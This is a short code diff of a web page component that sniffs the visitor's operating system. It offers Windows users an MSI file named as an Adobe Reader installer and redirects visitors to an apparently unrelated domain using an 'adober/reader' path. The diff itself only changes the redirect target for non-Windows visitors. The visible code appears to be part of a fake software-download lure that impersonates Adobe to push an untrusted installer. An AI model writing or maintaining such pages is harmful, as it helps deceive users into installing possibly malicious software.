@@ -5,7 +5,7 @@ export default function Home() {
     const userAgent = navigator.userAgent || "";
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";
+    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/cg";
     const MSI_FILE = "/Reader_Adobe-en_install.msi";
     const WINDOWS_REDIRECT = "https://wavemarkmx.com/adober/reader/download.html";
 
@@ -52,5 +52,6 @@ export default function Home() {
     </main>
   );
 }
+
 
 
